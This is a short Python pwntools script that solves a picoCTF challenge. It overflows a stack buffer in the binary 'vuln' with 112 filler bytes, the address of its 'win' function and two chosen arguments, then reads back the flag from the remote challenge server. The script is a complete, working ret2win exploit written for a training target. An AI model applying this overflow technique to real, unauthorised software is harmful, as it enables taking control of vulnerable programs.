#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 61407)

    return r


def main():
    r = conn()

    arb_retaddr = 0x0
    first_arg = 0xCAFEF00D
    secnd_arg = 0xF00DF00D

    r.sendlineafter(b': \n', 
        b'A'*112 + 
        p32(exe.symbols.win) + # 0x08049296
        p32(arb_retaddr) + 
        p32(first_arg) + 
        p32(secnd_arg)
    )

    r.recvline()

    while True:
        print(r.recvuntil(b'}'))

    r.interactive()


if __name__ == "__main__":
    main()
